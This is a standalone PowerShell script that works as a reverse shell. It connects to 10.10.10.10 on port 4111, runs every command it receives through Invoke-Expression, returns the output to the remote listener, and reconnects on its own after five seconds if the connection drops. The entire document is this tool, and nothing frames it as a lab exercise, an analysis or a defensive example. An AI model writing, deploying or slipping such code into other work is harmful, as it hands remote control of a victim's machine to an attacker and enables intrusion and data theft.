# Create a TCP client and connect to the specified address and port
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 4111)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
$writer.AutoFlush = $true

# Continuously listen for commands and execute them
while ($true) {
    try {
        # Read command from the listener
        $command = $reader.ReadLine()

        # Check if the command is null or empty and continue to next iteration
        if ([string]::IsNullOrWhiteSpace($command)) {
            continue
        }

        # Execute the command and capture the output
        $output = Invoke-Expression $command 2>&1 | Out-String

        # Send the output back to the listener
        $writer.WriteLine($output)
    }
    catch {
        # Handle any errors that occur during command execution
        $errorMessage = $_.Exception.Message
        $writer.WriteLine("Error: $errorMessage")
    }
    finally {
        # Check if the stream is still open, if not, re-establish the connection
        if (-not $client.Connected) {
            $client.Close()
            Start-Sleep -Seconds 5  # Sleep before trying to reconnect
            $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 4111)
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $reader = New-Object System.IO.StreamReader($stream)
            $writer.AutoFlush = $true
        }
    }
}